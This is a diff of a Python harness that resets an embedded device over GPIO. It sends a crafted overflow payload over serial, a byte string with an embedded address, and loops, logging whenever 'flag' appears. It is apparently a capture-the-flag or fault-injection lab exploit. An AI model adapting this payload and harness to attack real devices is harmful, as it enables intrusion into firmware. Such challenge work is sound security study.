@@ -79,7 +79,7 @@ def print_any_serial():
    if not line == b'':
       log(line)
       sys.stdout.flush()
-   return
+   return line
 
 def release_reset_and_wait():
     global ser
@@ -94,27 +94,32 @@ def release_reset_and_wait():
 Y_CRASH = b'0123456789abcd' + b'stuvwxyz' + binascii.unhexlify("3ffa0002ba") + b'\n'
 N_CRASH = b'01234' + b'\n'
 
-def go():
+def go(armed=True, crash=True):
    release_reset_and_wait()
 
-   pin_high(TRIG_OUT)
+   if armed: pin_high(TRIG_OUT)
 
-   ser.write(N_CRASH)
+   if crash: ser.write(Y_CRASH)
+   else:     ser.write(N_CRASH)
 
    sleep(0.100)
-   print_any_serial()
+   output = print_any_serial()
+   if b'flag' in output:
+      log("****FLAG*******************************************************")
 
-   pin_low(TRIG_OUT)
+   if armed: pin_low(TRIG_OUT)
    sleep(0.500)
 
    return
 
-pin_high(RESET)
 pin_output(RESET)
-pin_low(RESET)
+pin_high(RESET)
 
 pin_low(TRIG_OUT)
 pin_output(TRIG_OUT)
 
-for i in range(0,3):
-   go()
+for i in range(0,256):
+   go(crash=True,  armed=False)
+   go(crash=False, armed=False)
+   go(crash=True,  armed=True)
+
